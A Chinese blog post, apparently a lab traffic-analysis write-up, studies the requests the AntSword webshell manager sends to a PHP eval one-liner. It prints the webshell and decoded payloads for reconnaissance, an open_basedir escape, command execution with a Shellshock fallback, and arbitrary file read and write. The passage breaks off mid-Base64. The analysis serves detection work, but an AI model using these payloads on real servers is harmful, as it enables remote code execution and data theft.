@@ -1,0 +1,570 @@
+---
+title: 蚁剑PHP木马流量分析
+description: 对蚁剑PHP木马的流量进行分析
+pubDate: 11 04 2024
+image: https://img.trtyr.top/images/blog/%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/001%20%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-7.png
+categories:
+  - 网络安全
+tags:
+  - webshell
+  - 蚁剑
+  - 流量分析
+---
+
+环境为 phpstudy，木马为一句话木马 `<?php @eval($_POST['cmd']); ?>`，Webshell 地址为 `http://192.168.217.142/webshell/shell01.php`，
+
+## Defaut 编码器
+
+### 初始测试
+
+首先选择 Defaut 编码器，然后操作如下
+
+- 蚁剑中测试连接
+- 执行 `dir` 命令
+
+我们点击测试连接
+
+![](https://img.trtyr.top/images/blog/%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/001%20%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-2.png)
+
+流量如下
+
+![](https://img.trtyr.top/images/blog/%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/001%20%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-3.png)
+
+注意到流量特征
+
+- HTTP 使用的是 POST 请求，路径为 WebShell 路径
+- `Content-Type` 为 `application/x-www-form-urlencoded`
+
+追踪 TCP 流
+
+![](https://img.trtyr.top/images/blog/%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/001%20%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-4.png)
+
+可以看到，在 POST 请求中，存在一个 cmd 参数；然后返回了一些系统信息
+
+先看一下这个 POST 参数
+
+```shel
+cmd=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3B%24opdir%3D%40ini_get(%22open_basedir%22)%3Bif(%24opdir)%20%7B%24ocwd%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24oparr%3Dpreg_split(base64_decode(%22Lzt8Oi8%3D%22)%2C%24opdir)%3B%40array_push(%24oparr%2C%24ocwd%2Csys_get_temp_dir())%3Bforeach(%24oparr%20as%20%24item)%20%7Bif(!%40is_writable(%24item))%7Bcontinue%3B%7D%3B%24tmdir%3D%24item.%22%2F.7dfe3003a%22%3B%40mkdir(%24tmdir)%3Bif(!%40file_exists(%24tmdir))%7Bcontinue%3B%7D%24tmdir%3Drealpath(%24tmdir)%3B%40chdir(%24tmdir)%3B%40ini_set(%22open_basedir%22%2C%20%22..%22)%3B%24cntarr%3D%40preg_split(%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22%2C%24tmdir)%3Bfor(%24i%3D0%3B%24i%3Csizeof(%24cntarr)%3B%24i%2B%2B)%7B%40chdir(%22..%22)%3B%7D%3B%40ini_set(%22open_basedir%22%2C%22%2F%22)%3B%40rmdir(%24tmdir)%3Bbreak%3B%7D%3B%7D%3B%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%22f5fff%22.%22ec646%22%3Becho%20%40asenc(%24output)%3Becho%20%221eb1%22.%2215451%22%3B%7Dob_start()%3Btry%7B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D)%3B%24R%3D%22%7B%24D%7D%09%22%3Bif(substr(%24D%2C0%2C1)!%3D%22%2F%22)%7Bforeach(range(%22C%22%2C%22Z%22)as%20%24L)if(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists(%22posix_getegid%22))%3F%40posix_getpwuid(%40posix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B
+```
+
+其中 cmd 是我们的参数，也就是我们 webshell 的密码。对 cmd 参数内容进行解码处理，得到如下 php 代码
+
+```php
+<?php
+// 设置错误显示为0，禁止错误信息输出
+@ini_set("display_errors", "0");
+// 设置脚本的最大执行时间为无限制
+@set_time_limit(0);
+
+// 获取PHP的open_basedir限制
+$opdir = @ini_get("open_basedir");
+
+// 如果open_basedir设置了限制
+if ($opdir) {
+    // 获取当前脚本的目录
+    $ocwd = dirname($SERVER["SCRIPT_FILENAME"]);
+    // 将open_basedir中的路径按斜杠分割成数组
+    $oparr = preg_split(base64_decode("Lzt8Oi8="), $opdir);
+    // 将当前目录和临时目录添加到路径数组中
+    @array_push($oparr, $ocwd, sys_get_temp_dir());
+
+    // 遍历每个路径项
+    foreach ($oparr as $item) {
+        // 如果该路径不可写，继续下一个
+        if (!@is_writable($item)) {
+            continue;
+        }
+
+        // 创建一个名为.7dfe3003a的目录
+        $tmdir = $item . "/.7dfe3003a";
+        @mkdir($tmdir);
+
+        // 如果目录未创建成功，继续下一个
+        if (!@file_exists($tmdir)) {
+            continue;
+        }
+
+        // 获取真实路径
+        $tmdir = realpath($tmdir);
+        // 切换到新创建的目录
+        @chdir($tmdir);
+        // 修改open_basedir为上级目录
+        @ini_set("open_basedir", "..");
+
+        // 将目录路径分割为数组
+        $cntarr = @preg_split("#\\\\|//#", $tmdir);
+        // 返回到上级目录的层级
+        for ($i = 0; $i < sizeof($cntarr); $i++) {
+            @chdir("..");
+        }
+
+        // 恢复open_basedir为根目录
+        @ini_set("open_basedir", "/");
+        // 删除创建的目录
+        @rmdir($tmdir);
+        break; // 找到可用的路径后，退出循环
+    }
+}
+
+// 函数：返回未加密的输出
+function asenc($out) {
+    return $out;
+}
+
+// 函数：获取并输出当前的PHP环境信息
+function asoutput() {
+    // 获取输出缓冲区的内容
+    $output = ob_get_contents();
+    ob_end_clean(); // 清空缓冲区
+    echo "f5fff" . "ec646"; // 输出固定字符串
+    echo @asenc($output); // 输出内容
+    echo "1eb1" . "5451"; // 输出固定字符串
+}
+
+// 开始输出缓冲
+ob_start();
+try {
+    // 获取当前脚本所在目录
+    $D = dirname($SERVER["SCRIPT_FILENAME"]);
+    // 如果目录为空，则尝试获取PATH_TRANSLATED目录
+    if ($D == "") {
+        $D = dirname($SERVER["PATH_TRANSLATED"]);
+    }
+
+    // 初始化返回路径变量
+    $R = "{$D}\t";
+    // 如果目录不以'/'开头，检查可用的磁盘驱动器
+    if (substr($D, 0, 1) != "/") {
+        foreach (range("C", "Z") as $L) {
+            if (is_dir("{$L}:")) {
+                $R .= "{$L}:";
+            }
+        }
+    } else {
+        $R .= "/";
+    }
+
+    $R .= "\t"; // 添加制表符
+    // 获取当前用户信息
+    $u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : "";
+    $s = ($u) ? $u["name"] : @get_current_user();
+    // 获取系统信息并构建返回字符串
+    $R .= php_uname();
+    $R .= "\t{$s}"; // 添加当前用户名称
+    echo $R; // 输出最终信息
+} catch (Exception $e) {
+    // 捕获异常并输出错误信息
+    echo "ERROR:// " . $e->getMessage();
+}
+
+// 调用输出函数并结束脚本
+asoutput();
+die();
+
+```
+
+捋一下代码。首先设置错误显示为 0，禁止错误信息输出；设置脚本的最大执行时间为无限制。然后获取 PHP 的 open_basedir 限制，这里默认设置是空
+
+![](https://img.trtyr.top/images/blog/%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/001%20%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-5.png)
+
+然后下面那一段 if 函数就不用看了。然后写了俩函数，接着开始缓冲，获取当前文件的位置，如果获取不到，就又换了个函数去获取。接着，如果不是 `\` 开头，也就是说当前系统是 linux，那么就去找盘符，并将内容传给 R 变量。接着获取当前用户信息，获取系统信息并构建返回字符串。R 先加系统信息，然后加用户信息。也就是说，R 现在是 `路径 盘符 系统信息 用户信息`。接着输出 R 变量，先存在缓冲区里
+
+接着调用了 `asoutput();`，这个函数清空缓冲区后，会输出固定的字符串 `echo "f5fff" . "ec646";`，即 `f5fffec646`。然后调用 `asenc` 函数并传入参数 `output`。该函数会返回传入的参数值，即返回 `output` 参数值。`output` 的值是当前缓冲区里的内容，也就是 R 变量的内容。然后输出 `1eb15451`
+
+结果如下
+
+```
+f5fffec646D:/phpstudy_pro/WWW/webshell	C:D:	Windows NT SIMPLE 10.0 build 19045 (Windows 10) AMD64	trtyr1eb115451
+```
+
+![](https://img.trtyr.top/images/blog/%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/001%20%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-6.png)
+
+### 命令执行测试
+
+我们执行 `dir` 命令，得到如下流量
+
+![](https://img.trtyr.top/images/blog/%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/001%20%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-7.png)
+
+可以看到，返回了 `dir` 的结果，POST 参数如下
+
+```php
+<?php
+@ini_set("display_errors", "0"); // 禁用错误显示
+@set_time_limit(0); // 取消脚本的最大执行时间
+$opdir = @ini_get("open_basedir"); // 获取 open_basedir 的设置
+
+// 如果 open_basedir 被设置
+if ($opdir) {
+    $ocwd = dirname($SERVER["SCRIPT_FILENAME"]); // 获取当前脚本的目录
+    // 将 open_basedir 字符串按路径分割
+    $oparr = preg_split(base64_decode("Lzt8Oi8="), $opdir);
+    @array_push($oparr, $ocwd, sys_get_temp_dir()); // 将当前目录和临时目录添加到数组
+
+    // 遍历路径数组
+    foreach ($oparr as $item) {
+        // 如果路径不可写，跳过
+        if (!@is_writable($item)) {
+            continue;
+        }
+        // 创建一个新的目录
+        $tmdir = $item . "/.2f32f1";
+        @mkdir($tmdir); // 尝试创建目录
+        // 如果目录创建失败，跳过
+        if (!@file_exists($tmdir)) {
+            continue;
+        }
+        $tmdir = realpath($tmdir); // 获取目录的绝对路径
+        @chdir($tmdir); // 切换当前工作目录
+        @ini_set("open_basedir", ".."); // 设置 open_basedir 以允许访问上层目录
+        $cntarr = @preg_split("#/\\\\|//#", $tmdir); // 分割目录路径
+        // 向上切换目录
+        for ($i = 0; $i < sizeof($cntarr); $i++) {
+            @chdir("..");
+        }
+        @ini_set("open_basedir", "/"); // 恢复 open_basedir 设置
+        @rmdir($tmdir); // 删除创建的临时目录
+        break; // 只处理一个路径后退出
+    }
+}
+
+// 编码和输出相关的函数
+function asenc($out) {
+    return $out; // 直接返回输出
+}
+
+function asoutput() {
+    $output = ob_get_contents(); // 获取输出缓冲区的内容
+    ob_end_clean(); // 清空输出缓冲区
+    echo "d58" . "35c2"; // 输出前缀
+    echo @asenc($output); // 输出处理后的内容
+    echo "12e" . "8995"; // 输出后缀
+}
+
+// 开始输出缓冲
+ob_start();
+try {
+    // 解码 POST 数据
+    $p = base64_decode(substr($POST["xb0849d56f9f22"], 2));
+    $s = base64_decode(substr($POST["g901d4a8935157"], 2));
+    $envstr = @base64_decode(substr($POST["b23a17e8a00b5f"], 2));
+    $d = dirname($SERVER["SCRIPT_FILENAME"]); // 当前脚本目录
+    // 根据操作系统构建命令参数
+    $c = substr($d, 0, 1) == "/" ? "-c \"$s\"" : "/c \"$s\"";
+
+    // 设置环境变量 PATH
+    if (substr($d, 0, 1) == "/") {
+        @putenv("PATH=" . getenv("PATH") . ":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
+    } else {
+        @putenv("PATH=" . getenv("PATH") . ";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
+    }
+
+    // 如果环境字符串不为空，设置环境变量
+    if (!empty($envstr)) {
+        $envarr = explode("|||askey|||", $envstr);
+        foreach ($envarr as $v) {
+            if (!empty($v)) {
+                @putenv(str_replace("|||askey|||", "=", $v)); // 设置每个环境变量
+            }
+        }
+    }
+
+    $r = "{$p} {$c}"; // 构建要执行的命令
+
+    // 检查函数是否可用
+    function fe($f) {
+        $d = explode(",", @ini_get("disable_functions")); // 获取禁用函数列表
+        if (empty($d)) {
+            $d = array();
+        } else {
+            $d = array_map('trim', array_map('strtolower', $d)); // 规范化禁用函数列表
+        }
+        // 检查函数是否存在且可调用
+        return (function_exists($f) && is_callable($f) && !in_array($f, $d));
+    }
+
+    // 检查 shellshock 漏洞
+    function runshellshock($d, $c) {
+        if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {
+            if (strstr(readlink("/bin/sh"), "bash") != FALSE) { // 检查是否为 bash
+                $tmp = tempnam(sys_get_temp_dir(), 'as'); // 创建临时文件
+                putenv("PHP_LOL=() { x; };$c > $tmp 2>&1"); // 设置环境变量并执行命令
+                if (fe('error_log')) {
+                    error_log("a", 1); // 使用 error_log 记录输出
+                } else {
+                    mail("a@127.0.0.1", "", "", "-bv"); // 通过邮件记录输出
+                }
+            } else {
+                return False; // 不是 bash 返回 False
+            }
+            $output = @file_get_contents($tmp); // 获取命令输出
+            @unlink($tmp); // 删除临时文件
+            if ($output != "") {
+                print($output); // 输出结果
+                return True; // 执行成功
+            }
+        }
+        return False; // 执行失败
+    }
+
+    // 执行系统命令的函数
+    function runcmd($c) {
+        $ret = 0; // 返回值
+        $d = dirname($SERVER["SCRIPT_FILENAME"]); // 当前脚本目录
+        if (fe('system')) {
+            @system($c, $ret); // 使用 system 执行命令
+        } elseif (fe('passthru')) {
+            @passthru($c, $ret); // 使用 passthru 执行命令
+        } elseif (fe('shell_exec')) {
+            print(@shell_exec($c)); // 使用 shell_exec 执行命令
+        } elseif (fe('exec')) {
+            @exec($c, $o, $ret); // 使用 exec 执行命令
+            print(join("\n", $o)); // 输出结果
+        } elseif (fe('popen')) {
+            $fp = @popen($c, 'r'); // 使用 popen 打开进程
+            while (!@feof($fp)) {
+                print(@fgets($fp, 2048)); // 逐行读取输出
+            }
+            @pclose($fp); // 关闭进程
+        } elseif (fe('proc_open')) {
+            $p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io); // 使用 proc_open 打开进程
+            // 读取标准输出
+            while (!@feof($io[1])) {
+                print(@fgets($io[1], 2048));
+            }
+            // 读取标准错误
+            while (!@feof($io[2])) {
+                print(@fgets($io[2], 2048));
+            }
+            @fclose($io[1]); // 关闭标准输出
+            @fclose($io[2]); // 关闭标准错误
+            @proc_close($p); // 关闭进程
+        } elseif (fe('antsystem')) {
+            @antsystem($c); // 执行 antsystem
+        } elseif (runshellshock($d, $c)) {
+            return $ret; // 如果成功运行 shellshock，返回
+        } elseif (substr($d, 0, 1) != "/" && @class_exists("COM")) { // Windows 环境
+            $w = new COM('WScript.shell'); // 创建 COM 对象
+            $e = $w->exec($c); // 执行命令
+            $so = $e->StdOut(); // 获取标准输出
+            $ret .= $so->ReadAll(); // 读取输出
+            $se = $e->StdErr(); // 获取标准错误
+            $ret .= $se->ReadAll(); // 读取错误
+            print($ret); // 输出结果
+        } else {
+            $ret = 127; // 返回 127 表示命令未找到
+        }
+        return $ret; // 返回执行结果
+    }
+
+    // 执行命令并获取返回值
+    $ret = @runcmd($r . " 2>&1"); // 捕获标准错误输出
+    print($ret != 0) ? "ret={$ret}" : ""; // 如果返回值不为 0，输出返回值
+} catch (Exception $e) {
+    echo "ERROR://".$e->getMessage(); // 捕获异常并输出错误信息
+}
+
+// 最后调用 asoutput 函数输出结果
+asoutput(); // 输出缓存内容并结束脚本
+die(); // 终止脚本执行
+```
+
+这里注意一下，流量里还有这几个参数
+
+- `b23a17e8a00b5f`：`TW`
+- `g901d4a8935157`：`9pY2QgL2QgIkQ6L3BocHN0dWR5X3Byby9XV1cvd2Vic2hlbGwiJmRpciZlY2hvIGNkNTliZjExMCZjZCZlY2hvIDk1YmExYzNk`
+- `xb0849d56f9f22`：`UzY21k`
+
+然后我们从上往下捋一遍代码。一开始和上面的一样，就不说了，主要是缓冲区代码部分不同。
+
+首先是解码了三个参数的数据，从第二个字符开始截取，然后 base 64 解码，我们试试
+
+- `b23a17e8a00b5f` 截完就是空的
+- `g901d4a8935157` 截取后解码，得到 `cd /d "D:/phpstudy_pro/WWW/webshell"&dir&echo cd59bf110&cd&echo 95ba1c3d`
+- `xb0849d56f9f22` 截取后解码，得到 `cmd`
+
+然后读取目录，看目录的第一个字符是不是 `/`，如果是的话，就说明是 Linux 系统，不是就是 Windows，接着设置命令参数。然后根据目录的不同，去设置不同系统的环境变量，然后拆分成数组，挨个设置。接着设置好完整的命令代码。
+
+将命令传给 `runcmd` 函数，首选它初始化返回值 `$ret` 为 0，并获取当前脚本的目录。根据可用的 PHP 函数，函数尝试使用 `system`、`passthru`、`shell_exec`、`exec`、`popen` 或 `proc_open` 执行传入的命令 `$c`。如果环境支持，还会尝试使用 `runshellshock` 函数。如果脚本在 Windows 环境下且可用 COM 类，函数将创建一个 `WScript.shell` 对象执行命令并读取其输出。最后，如果命令未能找到，返回值会设置为 127。最终返回结果。如果返回值不为 0，输出返回值
+
+看看 `runshellshock` 函数。首先，它检查传入的目录 `$d` 是否为 Unix 风格（即以 "/" 开头），并确认 `putenv` 函数和 `error_log` 或 `mail` 函数是否可用。如果条件满足，它会检查当前的 shell 是否为 bash。如果是，函数会创建一个临时文件用于存储命令输出，并通过设置环境变量 `PHP_LOL` 执行传入的命令，将标准输出和错误重定向到该临时文件。接着，如果可用，会记录一条消息到错误日志，或发送邮件到本地地址。最后，函数读取并输出临时文件的内容，并删除该文件；如果命令成功执行，返回 `True`，否则返回 `False`。
+
+这里调用命令都是利用 `fe` 函数，它检查特定函数 `$f` 是否可用。首先，它通过 `ini_get("disable_functions")` 获取当前 PHP 配置中禁用的函数列表，并使用 `explode` 将其转换为数组 `$d`。接着，如果数组为空，则将其初始化为空数组；如果不为空，它会将函数名标准化为小写，并去除多余的空格。最后，函数返回一个布尔值，表示 `$f` 是否存在、可调用，并且不在禁用列表中。这样可以有效地判断某个函数是否可以在当前环境中使用。
+
+最后调用 `asoutput` 函数，和上面一样了
+
+最终返回
+
+```
+d5835c2 ...... D ........ ....
+ ............ 7B59-1233
+
+ D:\phpstudy_pro\WWW\webshell ......
+
+2024/11/04  19:15    <DIR>          .
+2024/11/04  19:15    <DIR>          ..
+2024/11/04  19:13                29 shell01.php
+               1 ......             29 ....
+               2 ...... 36,021,125,120 ........
+cd59bf110
+D:\phpstudy_pro\WWW\webshell
+95ba1c3d
+12e8995
+```
+
+![](https://img.trtyr.top/images/blog/%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/001%20%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-8.png)
+
+### GUI 读文件操作
+
+首先是蚁剑的 GUI 读文件
+
+![](https://img.trtyr.top/images/blog/%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/001%20%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-9.png)
+
+查看流量
+
+![](https://img.trtyr.top/images/blog/%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/001%20%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-10.png|1249)
+
+分析 POST 参数
+
+```php
+<?php @ini_set("display_errors", "0");
+@set_time_limit(0);
+$opdir = @ini_get("open_basedir");
+if ($opdir) {
+    $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
+    $oparr = preg_split(base64_decode("Lzt8Oi8="), $opdir);
+    @array_push($oparr, $ocwd, sys_get_temp_dir());
+    foreach ($oparr as $item) {
+        if (!@is_writable($item)) {
+            continue;
+        };
+        $tmdir = $item . "/.91b54fbc279";
+        @mkdir($tmdir);
+        if (!@file_exists($tmdir)) {
+            continue;
+        }
+        $tmdir = realpath($tmdir);
+        @chdir($tmdir);
+        @ini_set("open_basedir", "..");
+        $cntarr = @preg_split("/\\\\|\//", $tmdir);
+        for ($i = 0; $i < sizeof($cntarr); $i++) {
+            @chdir("..");
+        };
+        @ini_set("open_basedir", "/");
+        @rmdir($tmdir);
+        break;
+    };
+};;
+function asenc($out)
+{
+    return $out;
+};
+function asoutput()
+{
+    $output = ob_get_contents();
+    ob_end_clean();
+    echo "8d2" . "446";
+    echo @asenc($output);
+    echo "28b9" . "c4fd5";
+}
+ob_start();
+try {
+    $F = base64_decode(substr($_POST["t375ea9d8483d"], 2));
+    $P = @fopen($F, "r");
+    echo (@fread($P, filesize($F) ? filesize($F) : 4096));
+    @fclose($P);;
+} catch (Exception $e) {
+    echo "ERROR://" . $e->getMessage();
+};
+asoutput();
+die();
+
+```
+
+其他就不看了，重点就是缓冲区代码。其中 `t375ea9d8483d` 为 `LERDovcGhwc3R1ZHlfcHJvL1dXVy93ZWJzaGVsbC9zaGVsbDAxLnBocA==`
+
+从一个通过 `$_POST` 传入的 Base64 编码的字符串中解码文件路径，然后读取该文件的内容并输出。首先，它使用 `base64_decode` 函数对 `$_POST` 数组中键为 `"t375ea9d8483d"` 的值进行解码，去掉前两个字符后赋值给变量 `$F`，得到的是 `D:/phpstudy_pro/WWW/webshell/shell01.php`。接下来，代码尝试使用 `fopen` 函数打开 `$F` 指定的文件，模式为只读 (`"r"`)。若成功打开文件，它会使用 `fread` 函数读取文件内容，读取的字节数是文件大小，若文件大小为 0 则读取 4096 字节。读取到的内容会被输出。最后，使用 `fclose` 函数关闭文件句柄。如果在这一过程中发生任何异常，捕获 `Exception` 并输出错误信息，格式为 `"ERROR://<错误信息>"`。
+
+### 文件上传
+
+就不放流量了，直接看代码
+
+```php
+try {
+    $f = base64_decode(substr($_POST["yb6f4c93941b6a"], 2));
+    $c = $_POST["z7e3c896d9613e"];
+    $c = str_replace("\r", "", $c);
+    $c = str_replace("\n", "", $c);
+    $buf = "";
+    for ($i = 0; $i < strlen($c); $i += 2) $buf .= urldecode("%" . substr($c, $i, 2));
+    echo (@fwrite(fopen($f, "a"), $buf) ? "1" : "0");;
+} catch (Exception $e) {
+    echo "ERROR://" . $e->getMessage();
+};
+```
+
+`yb6f4c93941b6a` 参数为 `mbRDovcGhwc3R1ZHlfcHJvL1dXVy93ZWJzaGVsbC8xLnR4dA==`，解出来得到 `D:/phpstudy_pro/WWW/webshell/1.txt`
+
+`z7e3c896d9613e` 参数为 `52575F49485A2E4B46593E4848532D49485A204141414142334E7A614331796332454141414144415141424141414241487153495359666B777546655832304B547479446870472F6E6D794D4B354D726D6A4B494C55624C7870457467772B346930734952347357744E70475356414D4C5A34594F384559367037464277307A347530414C6F32714338493736336C664B6C4E584831574857657852486437324D457078704F7A743739756B61624572374F57705264444549536A334D7945616C564E5947544B4D742F545157522F646E46642B54734442326152444251517139566651685A395A38363468755134447538504B673432706C7A6652504A73456865344A70453047573551526170395A4E484D2F34665353484A6C7771624271476465496A772B55377A592F526F6B784B3937392B6637534E36714D6339467A4155546E627746474C705A65346F687A3470504A4E726D524B66455254534B446F5877316B7264445A75455A7A436769707270523857714C76476F44586859737463726757553D0D0A0D0A`
+
+首先，它对 POST 请求中的一个参数进行解码，获取文件路径；然后获取另一个参数，并移除其中的回车和换行符，形成一行文本。接着，它通过循环将这行文本的每两个字符进行 URL 解码，最终将解码后的内容写入指定的文件。如果写入成功，返回 `"1"`，失败则返回 `"0"`。在执行过程中，如果发生异常，则捕获并输出错误信息。需要注意的是，这段代码存在安全隐患，攻击者可以利用它在服务器上写入任意文件，因此应对用户输入进行严格验证和限制。
+
+文本处理得到
+
+```
+RW_IHZ.KFY>HHS-IHZ AAAAB3NzaC1yc2EAAAADAQABAAABAHqSISYfkwuFeX20KTtyDhpG/nmyMK5MrmjKILUbLxpEtgw+4i0sIR4sWtNpGSVAMLZ4YO8EY6p7FBw0z4u0ALo2qC8I763lfKlNXH1WHWexRHd72MEpxpOzt79ukabEr7OWpRdDEISj3MyEalVNYGTKMt/TQWR/dnFd+TsDB2aRDBQQq9VfQhZ9Z864huQ4Du8PKg42plzfRPJsEhe4JpE0GW5QRap9ZNHM/4fSSHJlwqbBqGdeIjw+U7zY/RokxK979+f7SN6qMc9FzAUTnbwFGLpZe4ohz4pPJNrmRKfERTSKDoXw1krdDZuEZzCgiprpR8WqLvGoDXhYstcrgWU=
+```
+
+![](https://img.trtyr.top/images/blog/%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/001%20%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-11.png)
+
+和要传的文件内容相同。
+
+至于其他的操作，其实都大差不差了
+
+## Base64 编码器
+
+其实返回的结果都一样，就是请求处理的不同
+
+```php
+<?php @eval(@base64_decode($_POST['la49b27c2d7398']));
+```
+
+`la49b27c2d7398` 为 `QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoYmFzZTY0X2RlY29kZSgiTHp0OE9pOD0iKSwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLmMyYTA1ZGE0MzIwZiI7QG1rZGlyKCR0bWRpcik7aWYoIUBmaWxlX2V4aXN0cygkdG1kaXIpKXtjb250aW51ZTt9JHRtZGlyPXJlYWxwYXRoKCR0bWRpcik7QGNoZGlyKCR0bWRpcik7QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsICIuLiIpOyRjbnRhcnI9QHByZWdfc3BsaXQoIi9cXFxcfFwvLyIsJHRtZGlyKTtmb3IoJGk9MDskaTxzaXplb2YoJGNudGFycik7JGkrKyl7QGNoZGlyKCIuLiIpO307QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTtAcm1kaXIoJHRtZGlyKTticmVhazt9O307O2Z1bmN0aW9uIGFzZW5jKCRvdXQpe3JldHVybiAkb3V0O307ZnVuY3Rpb24gYXNvdXRwdXQoKXskb3V0cHV0PW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2VjaG8gIjg2ZDRjIi4iMzZiMTciO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gImY0OGIzIi4iMzg2Y2E5Ijt9b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH0JIjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJDIiwiWiIpYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNleyRSLj